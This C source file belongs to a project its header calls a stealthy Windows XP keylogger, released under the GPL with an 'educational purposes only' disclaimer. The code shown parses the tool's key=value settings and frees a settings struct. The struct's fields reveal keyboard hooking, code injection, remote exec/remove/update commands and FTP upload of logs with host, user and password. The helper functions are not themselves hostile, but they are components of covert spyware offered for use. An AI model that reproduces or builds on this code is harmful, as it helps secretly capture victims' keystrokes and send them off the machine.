
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.



#include <stdlib.h> 
#include <string.h> 
#include <windows.h> 
#include "Common.h" 


char* SettingsGetValue(char* block, unsigned int blocksz, const char* const key) { 
	/*	Return value of 'key' in datablock as char* 
		CALLER IS RESPONSIBLE FOR CALLING free() on 
		return value. 
		Syntax of datablock is: 
		key=value\x00key=value\x00 */ 
	char* e; 
	int len; 
	unsigned int start; 
	char* offset; 

	len = strlen(key); 
	if (!len) return 0; 

	for(start=0; start < blocksz;) { 
		/*	Each pair is separated by a NUL. This means 
			strlen() will only give us the length of the 
			pair, NOT the full datablock. */ 
		offset = block+start; 
		e = strstr(offset, "="); 
		if (!e) return 0; 

		/* From 0 to E length of a key. */ 
		if (0==strncmp(offset, key, e-offset)) { 
			/*	I normally would _not_ do this. I would 
				pass in a buffer and sz, but I think in 
				this case it's safe to do it this way. It's 
				also a lot more convenient. */ 
			char* ret;
			char* tmp; 
			unsigned int sz; 
/*			tmp = offset+e+1; */ 
			tmp = e+1; 
			sz = strlen(tmp); 
			ret = malloc(sz+1); 
			if (!ret) return 0; 
			strncpy(ret, tmp, sz); 
			ret[sz] = '\0'; 
			return ret; 
		} 
		start += strlen(block+start)+1; 
	} 
	return 0; 
}


void FreeSettings(const LTSSettings* settings) { 
	free(settings->alias); 
	free(settings->path); 
	free(settings->logname); 
	free(settings->filename); 
	free(settings->hookname); 
	free(settings->injectname); 

	free(settings->exec); 
	free(settings->remove); 
	free(settings->update); 

	free(settings->ftproot); 
	free(settings->ftphost); 
	free(settings->ftpuser); 
	free(settings->ftppass); 
} 


